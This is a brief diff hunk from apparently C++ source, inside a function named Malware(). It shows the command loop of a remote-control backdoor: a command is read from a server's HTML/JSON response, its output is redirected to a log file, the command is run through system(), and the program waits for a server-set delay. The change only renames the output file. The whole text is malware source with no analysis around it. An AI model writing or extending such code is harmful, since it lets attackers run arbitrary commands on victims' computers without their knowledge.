@@ -170,7 +170,7 @@ void Malware()
       int time = stoi(DeserializeJson("time",htmlResponse));
       if(command != urlActionCommand && command != "null" && commandCharArray[0] != '#')
       {
-        command += "> "+GetOutput()+"output.txt";
+        command += "> "+GetOutput()+"outputLog.txt";
         system(command.c_str());
         Sleep(time);
       }
